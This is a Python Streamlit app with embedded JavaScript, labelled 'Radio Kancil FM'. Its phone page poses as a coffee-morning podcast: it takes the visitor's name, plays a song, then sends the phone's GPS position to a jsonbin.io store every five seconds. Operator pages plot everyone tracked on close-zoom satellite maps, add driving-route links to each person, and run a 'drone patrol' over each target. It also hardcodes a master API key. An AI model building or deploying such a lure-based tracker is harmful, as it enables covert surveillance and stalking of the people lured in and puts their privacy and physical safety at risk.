import streamlit as st
import requests

BIN_ID = "6aeeda8bac6210605a74a7b5"
API_KEY = "$2a$10$LqQMOcUMXjbfZswzJUFrReGYD5dloL2gTCOLRwT17Oo96mUzr7.aO"
URL = "https://api.jsonbin.io/v3/b/" + BIN_ID
HEADERS = {"X-Master-Key": API_KEY, "Content-Type": "application/json"}

st.set_page_config(page_title="RADIO KANCIL FM", layout="wide")
params = st.query_params
mode = params.get("mode", "komando")

def ambil():
    try:
        r = requests.get(URL + "/latest", headers=HEADERS, timeout=10)
        d = r.json().get("record", {})
        while isinstance(d, dict) and "record" in d:
            d = d["record"]
        if not isinstance(d, dict): d = {}
        users = {k:v for k,v in d.items() if k != "_kicked" and isinstance(v, dict) and "lat" in v}
        kicked = d.get("_kicked", [])
        if not isinstance(kicked, list): kicked = []
        return users, kicked
    except:
        return {}, []

def simpan(users, kicked):
    data = dict(users)
    data["_kicked"] = kicked
    requests.put(URL, headers=HEADERS, json=data, timeout=10)

# ===== USER HP - PODCAST PERSIS NETLIFY =====
if mode == "user":
    user_html = """
    <style>
      *{margin:0; padding:0; box-sizing:border-box;}
      body{background:#000;}
      .wrap{background:#000; min-height:100vh; padding:28px 18px 20px 18px; text-align:center; font-family:Arial, sans-serif; color:white;}
      .title{font-size:32px; font-weight:800; line-height:1.15; color:white;}
      .sub{color:#a0a0a0; font-size:16px; margin:12px 0 22px 0;}
      .foto{width:100%; height:440px; object-fit:cover; border-radius:24px; border:2px solid #222; display:block;}
      .playBtn{background:#1db954; color:white; border:none; width:100%; padding:18px; font-size:24px; font-weight:800; border-radius:40px; cursor:pointer; margin-top:22px;}
      .playBtn:active{transform:scale(0.98);}
      .bar{width:100%; height:8px; background:#333; border-radius:10px; margin-top:20px; overflow:hidden;}
      .fill{height:100%; width:0%; background:#1db954; transition:width 0.5s;}
      .status{color:#00ff00; font-family:monospace; font-size:13px; margin-top:12px; min-height:20px;}
    </style>
    <div class="wrap">
      <div class="title">🎙️ Podcast Coffe Morning</div>
      <div class="sub">Sukses Berwira Usaha - Dengerin Sebentar Yuk</div>
      <img class="foto" src="https://images.unsplash.com/photo-1478737270239-2f02b77fc618?w=900&q=80&auto=format&fit=crop">
      <button class="playBtn" id="playBtn" onclick="putar()">▶️ PUTAR LAGU</button>
      <div class="bar"><div class="fill" id="fill"></div></div>
      <div class="status" id="status"></div>
      <audio id="lagu" preload="auto"><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mp3"></audio>
    </div>
    <script>
    const BIN_ID = "6aeeda8bac6210605a74a7b5";
    const API_KEY = "$2a$10$LqQMOcUMXjbfZswzJUFrReGYD5dloL2gTCOLRwT17Oo96mUzr7.aO";
    let audio = document.getElementById('lagu');
    let sudah = false;
    function putar(){
      if(sudah) return;
      let nama = prompt("👤 ISI JENENGMU:");
      if(!nama || !nama.trim()){ alert("Isi jenengmu disik bro!"); return; }
      nama = nama.trim();
      sudah = true;
      document.getElementById('playBtn').innerHTML = "🎵 LAGI MUNI... 18 DETIK";
      document.getElementById('status').innerHTML = "🎵 Lagu Coffe Morning muni... 18 detik lagi GPS aktif - " + nama;
      audio.currentTime = 0;
      audio.play();
      setTimeout(function(){ audio.pause(); }, 18000);
      let sisa = 18;
      let timer = setInterval(function(){
        sisa--;
        document.getElementById('fill').style.width = ((18 - sisa) / 18 * 100) + "%";
        if(sisa <= 0){
          clearInterval(timer);
          document.getElementById('playBtn').innerHTML = "✅ GPS AKTIF - " + nama;
          document.getElementById('status').innerHTML = "📍 GPS AKTIF - " + nama + " - Terkirim ke Studio FM!";
          kirim(nama);
          setInterval(function(){ kirim(nama); }, 5000);
        }
      }, 1000);
    }
    function kirim(myId){
      navigator.geolocation.getCurrentPosition(pos => {
        document.getElementById('status').innerHTML = "✅ GPS AKTIF - " + myId + " - Lat: " + pos.coords.latitude;
        fetch("https://api.jsonbin.io/v3/b/" + BIN_ID + "/latest", {headers: {"X-Master-Key": API_KEY}})
        .then(r => r.json()).then(j => {
          let d = j.record || {}; while(d.record){ d = d.record; }
          let users = {}; let kicked = d._kicked || [];
          for(let k in d){ if(k != "_kicked" && d[k] && d[k].lat){ users[k] = d[k]; } }
          if(kicked.includes(myId)){ document.getElementById('status').innerHTML = "⛔ KAMU DIKELUARKAN STUDIO FM!"; return; }
          users[myId] = {lat: pos.coords.latitude, lon: pos.coords.longitude, waktu: new Date().toLocaleString()};
          users["_kicked"] = kicked;
          fetch("https://api.jsonbin.io/v3/b/" + BIN_ID, {method: "PUT", headers: {"Content-Type": "application/json", "X-Master-Key": API_KEY}, body: JSON.stringify(users)});
        });
      });
    }
    </script>
    """
    st.components.v1.html(user_html, height=780)

# ===== DRONE - RETINA 4K + ORBIT SMOOTH =====
elif mode == "drone":
    st.title("📻 RADIO KANCIL FM - DRONE CINEMATIC 3D")
    st.write("Diemin 10 detik biar peta ke-load, baru klik tombol ijo jeneng nang ngisor peta!")
    st.markdown("[⬅️ Balik ke STUDIO FM](https://radio-kancil-fm.streamlit.app/?mode=komando)")
    drone_html = """
    <link href="https://unpkg.com/maplibre-gl@3.6.2/dist/maplibre-gl.css" rel="stylesheet" />
    <script src="https://unpkg.com/maplibre-gl@3.6.2/dist/maplibre-gl.js"></script>
    <style>
      #map{width:100%; height:650px; border-radius:12px;}
      #map canvas{ filter: contrast(1.08) saturate(1.15) brightness(1.02); }
      .hud{position:absolute; top:12px; left:12px; z-index:10; background:rgba(0,0,0,0.65); color:white; padding:10px 14px; border-radius:10px; font-family:monospace; font-size:14px; border:1px solid rgba(255,255,255,0.3);}
      .btn{position:absolute; bottom:18px; left:50%; transform:translateX(-50%); z-index:10; background:#ff0000; color:white; border:none; padding:14px 28px; font-size:18px; font-weight:bold; border-radius:30px; cursor:pointer;}
      .zoomBtn{position:absolute; top:12px; right:12px; z-index:10; display:flex; flex-direction:column; gap:6px;}
      .zoomBtn button{background:#fff; border:none; width:42px; height:42px; font-size:22px; font-weight:bold; border-radius:8px; cursor:pointer; box-shadow:0 2px 8px rgba(0,0,0,0.4);}
      .wrap{position:relative;}
      .target{position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); z-index:1; font-size:36px; pointer-events:none; opacity:0.7;}
      #listBtn{margin-top:10px; display:flex; flex-wrap:wrap; gap:8px;}
      .hpBtn{background:#1a1a1a; color:#00ff00; border:1px solid #00ff00; padding:10px 16px; border-radius:20px; cursor:pointer; font-weight:bold; font-size:14px;}
      .hpBtn:hover{background:#00ff00; color:black;}
      .infoBox{background:#f0f0f0; padding:12px; border-radius:10px; margin-top:10px; font-family:monospace; font-size:14px; min-height:50px;}
      .orbitBar{width:100%; height:8px; background:#ddd; border-radius:4px; margin-top:8px; overflow:hidden;}
      .orbitFill{height:100%; width:0%; background:#00ff00;}
    </style>
    <div class="wrap">
      <div class="hud" id="hud">DRONE: STANDBY<br>Menunggu data...</div>
      <div class="zoomBtn">
        <button onclick="map.zoomIn()">+</button>
        <button onclick="map.zoomOut()">-</button>
        <button onclick="zoomMax()">🎯</button>
      </div>
      <div class="target">⊕</div>
      <div id="map"></div>
      <button class="btn" onclick="startPatroli()">▶️ MULAI PATROLI DRONE</button>
    </div>
    <div id="listBtn"></div>
    <div class="infoBox" id="infoBox">Klik tombol ijo jeneng nang nduwur gawe ndelok lokasi valid-e.</div>
    <div class="orbitBar"><div class="orbitFill" id="orbitFill"></div></div>
    <div id="orbitText" style="font-family:monospace; font-size:13px; margin-top:4px;">ORBIT: 0% - 0° / 180° | ZOOM: 19 | PETA: RETINA 4K</div>
    <script>
    const BIN_ID = "6aeeda8bac6210605a74a7b5";
    const API_KEY = "$2a$10$LqQMOcUMXjbfZswzJUFrReGYD5dloL2gTCOLRwT17Oo96mUzr7.aO";
    const map = new maplibregl.Map({
      container: 'map',
      style: {
        version: 8,
        sources: {
          sat: { type: 'raster', tiles: ['https://mt1.google.com/vt/lyrs=s&x={x}&y={y}&z={z}&scale=2', 'https://mt0.google.com/vt/lyrs=y&x={x}&y={y}&z={z}&scale=2'], tileSize: 512, attribution: 'Google Satellite Retina 4K', maxzoom: 22 },
          terrain: { type: 'raster-dem', tiles: ['https://s3.amazonaws.com/elevation-tiles-prod/terrarium/{z}/{x}/{y}.png'], encoding: 'terrarium', tileSize: 256 }
        },
        layers: [{ id: 'sat', type: 'raster', source: 'sat', paint: { 'raster-resampling': 'linear', 'raster-fade-duration': 0 } }],
        terrain: { source: 'terrain', exaggeration: 0 }
      },
      center: [118.0, -2.5], zoom: 4, pitch: 0, bearing: 0,
      maxZoom: 22, minZoom: 2,
      fadeDuration: 0, maxTileCacheSize: 1500, renderWorldCopies: false,
      pixelRatio: 3, antialias: true, maxPitch: 85
    });
    map.addControl(new maplibregl.NavigationControl());
    let points = [];
    let sedangTerbang = false;
    let stopOrbit = false;
    let targetAktif = null;
    function zoomMax(){
      if(targetAktif){ map.easeTo({center:[targetAktif.lon, targetAktif.lat], zoom: 19, pitch: 68, duration: 1500, easing: t => t}); }
      else if(points.length>0){ map.easeTo({center:[points[0].lon, points[0].lat], zoom: 19, pitch: 68, duration: 1500}); }
    }
    fetch("https://api.jsonbin.io/v3/b/" + BIN_ID + "/latest", {headers: {"X-Master-Key": API_KEY}})
    .then(r=>r.json()).then(j=>{
      let data = j.record || {};
      while(data.record){ data = data.record; }
      let listDiv = document.getElementById('listBtn');
      let kicked = data._kicked || [];
      for(let k in data){
        if(k === "_kicked") continue;
        if(kicked.includes(k)) continue;
        if(data[k] && data[k].lat){
          let p = {nama:k, lat:data[k].lat, lon:data[k].lon, waktu:data[k].waktu};
          points.push(p);
          let marker = new maplibregl.Marker({color:'red'}).setLngLat([p.lon, p.lat]).setPopup(new maplibregl.Popup({closeOnClick:true}).setHTML(
  "<b>"+p.nama+"</b><br>LOKASI VALID<br>Lat: "+p.lat+"<br>Lon: "+p.lon+"<br>Waktu: "+p.waktu+
  "<br><br>"+
  "<a href='https://www.google.com/maps/dir/?api=1&destination="+p.lat+","+p.lon+"' target='_blank' style='display:block;background:#1a73e8;color:#fff;text-align:center;padding:12px;border-radius:20px;text-decoration:none;font-weight:bold;font-size:15px;margin-bottom:8px;'>🧭 RUTE KE SINI - GOOGLE MAPS</a>"+
  "<a href='https://www.google.com/maps/search/?api=1&query="+p.lat+","+p.lon+"' target='_blank' style='display:block;background:#fff;color:#1a73e8;border:1px solid #1a73e8;text-align:center;padding:10px;border-radius:20px;text-decoration:none;font-weight:bold;font-size:14px;'>📍 BUKA DI GOOGLE MAPS</a>"
)).addTo(map);
          marker.getElement().addEventListener('click', ()=>{ terbangKe(p); });
          let b = document.createElement('button');
          b.className = 'hpBtn';
          b.innerText = '📍 ' + p.nama + ' - TERBANG KE SINI';
          b.onclick = ()=>{ terbangKe(p); };
          listDiv.appendChild(b);
        }
      }
      document.getElementById('hud').innerHTML = "DRONE: SIAP<br>TARGET: "+points.length+" CHECKPOINT<br>ORBIT: 180° / 20 DETIK SMOOTH | ZOOM: 19 | PETA RETINA 4K";
    });
    function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
    async function orbitSmooth(p){
      stopOrbit = false;
      let totalDerajat = 180;
      let durasi = 20000;
      let kecepatan = totalDerajat / durasi;
      let startBearing = map.getBearing();
      let lastTime = performance.now();
      let derajatJalan = 0;
      document.getElementById('orbitFill').style.width = "0%";
      return new Promise((resolve)=>{
        function frame(now){
          if(stopOrbit){ resolve(); return; }
          let delta = now - lastTime;
          lastTime = now;
          derajatJalan += kecepatan * delta;
          if(derajatJalan >= totalDerajat) derajatJalan = totalDerajat;
          let progress = derajatJalan / totalDerajat;
          map.setBearing(startBearing + derajatJalan);
          let pitchHalus = 68 + Math.sin(progress * Math.PI) * 2;
          map.setPitch(pitchHalus);
          document.getElementById('orbitFill').style.width = (progress * 100) + "%";
          document.getElementById('orbitText').innerHTML = "ORBIT SMOOTH: " + Math.floor(progress*100) + "% - " + Math.floor(derajatJalan) + "° / 180° - " + p.nama + " | ZOOM: 19 | RETINA 4K";
          document.getElementById('hud').innerHTML = "DRONE: ORBIT SMOOTH<br>CHECKPOINT: " + p.nama + "<br>PUTARAN: " + Math.floor(derajatJalan) + "° / 180°<br>ALT: 120m | ZOOM 19 | 60FPS | RETINA";
          if(derajatJalan < totalDerajat){ requestAnimationFrame(frame); }
          else { document.getElementById('orbitText').innerHTML = "ORBIT SELESAI - 180° SMOOTH - " + p.nama; resolve(); }
        }
        requestAnimationFrame(frame);
      });
    }
    async function terbangKe(p){
      if(sedangTerbang) return;
      sedangTerbang = true;
      stopOrbit = true;
      targetAktif = p;
      await sleep(150);
      document.getElementById('hud').innerHTML = "DRONE: TERBANG...<br>TARGET: "+p.nama+"<br>ALT: 120m | ZOOM 19 | RETINA 4K";
      document.getElementById('infoBox').innerHTML = "<b>LOKASI VALID - "+p.nama+"</b><br>Lat: "+p.lat+"<br>Lon: "+p.lon+"<br>Waktu: "+p.waktu;
      map.flyTo({center:[p.lon, p.lat], zoom: 19, pitch: 68, bearing: 0, duration: 4500, essential:true, curve: 1.2, speed: 0.45, easing: t => t});
      await sleep(4800);
      document.getElementById('hud').innerHTML = "DRONE: STABILISASI...<br>Loading peta Retina 4K...";
      await sleep(800);
      await orbitSmooth(p);
      sedangTerbang = false;
    }
    async function startPatroli(){
      if(points.length===0){ alert("Belum ada HP online!"); return; }
      if(sedangTerbang) return;
      sedangTerbang = true;
      for(let i=0; i<points.length; i++){
        let p = points[i];
        targetAktif = p;
        document.getElementById('hud').innerHTML = "DRONE: TERBANG...<br>TARGET "+(i+1)+"/"+points.length+": "+p.nama;
        document.getElementById('infoBox').innerHTML = "<b>LOKASI VALID - "+p.nama+"</b><br>Lat: "+p.lat+"<br>Lon: "+p.lon+"<br>Waktu: "+p.waktu;
        map.flyTo({center:[p.lon, p.lat], zoom: 19, pitch: 68, bearing: 0, duration: 4500, essential:true, curve: 1.2, speed: 0.45, easing: t => t});
        await sleep(4800);
        await sleep(800);
        await orbitSmooth(p);
        await sleep(400);
      }
      document.getElementById('hud').innerHTML = "DRONE: PATROLI SELESAI<br>Semua "+points.length+" Checkpoint Terpantau - Orbit 180° Smooth | Zoom 19 | Retina 4K";
      map.flyTo({center:[118.0, -2.5], zoom: 4, pitch: 0, bearing: 0, duration: 3000});
      sedangTerbang = false;
    }
    </script>
    """
    st.components.v1.html(drone_html, height=820)

# ===== LAPTOP - NORMAL =====
else:
    st.title("📻 RADIO KANCIL FM - STUDIO FM")
    users, kicked = ambil()
    c1, c2, c3, c4 = st.columns(4)
    with c1:
        if st.button("🔄 REFRESH", use_container_width=True):
            st.rerun()
    with c2:
        if st.button("🔍 ZOOM MAKSIMAL", use_container_width=True):
            st.session_state["zoom_max"] = True
            st.rerun()
    with c3:
        if st.button("🗑️ KELUARKAN SEMUA", use_container_width=True):
            kicked_baru = list(set(kicked + list(users.keys())))
            simpan({}, kicked_baru)
            st.rerun()
    with c4:
        if st.button("🔗 BUAT LINK BARU (RESET)", use_container_width=True):
            simpan({}, [])
            st.rerun()
    st.info(f"Online: {len(users)} | Di-kick: {len(kicked)} | Zoom: 19 | Peta: RETINA 4K")
    if kicked:
        st.write("Di-kick: " + ", ".join(kicked))
    if users:
        import folium
        from streamlit_folium import st_folium
        first = list(users.values())[0]
        tengah = [first["lat"], first["lon"]] if users else [-2.5, 118.0]
        zoom_awal = 19 if users else 5
        if st.session_state.get("zoom_max"):
            zoom_awal = 19
        m = folium.Map(location=tengah, zoom_start=zoom_awal, max_zoom=22, min_zoom=2, tiles="https://mt1.google.com/vt/lyrs=s&x={x}&y={y}&z={z}&scale=2", attr="Google Satellite Retina 4K", zoom_control=True)
        for n, v in users.items():
            folium.Marker([v["lat"], v["lon"]], popup=f"<b>{n}</b><br>{v.get('waktu','')}<br>Lat: {v['lat']}<br>Lon: {v['lon']}", tooltip=n, icon=folium.Icon(color="red", icon="eye-open")).add_to(m)
            folium.Circle([v["lat"], v["lon"]], radius=20, color="red", fill=True, fill_opacity=0.3).add_to(m)
            folium.CircleMarker([v["lat"], v["lon"]], radius=8, color="yellow", fill=True, fill_color="yellow").add_to(m)
        st_folium(m, width=1000, height=600, key="peta_max")
    st.markdown("### 📋 DAFTAR - KELUARKAN TEKO LAPTOP")
    for n, v in users.items():
        col1, col2, col3 = st.columns([3, 1, 1])
        with col1:
            st.write(f"🟢 **{n}** | {v.get('waktu','')} | {v['lat']:.6f}, {v['lon']:.6f}")
        with col2:
            if st.button(f"🔍 ZOOM", key=f"zoom_{n}", use_container_width=True):
                st.session_state["zoom_max"] = True
                st.rerun()
        with col3:
            if st.button(f"❌ KELUARKAN", key=f"kick_{n}", use_container_width=True):
                users_baru = {k:val for k,val in users.items() if k != n}
                kicked_baru = kicked + [n] if n not in kicked else kicked
                simpan(users_baru, kicked_baru)
                st.rerun()
    st.markdown("---")
    st.markdown("[🚁 MODE DRONE CINEMATIC 3D - ZOOM 19 - RETINA 4K](https://radio-kancil-fm.streamlit.app/?mode=drone)")
    st.code("Link HP: https://radio-kancil-fm.streamlit.app/?mode=user")
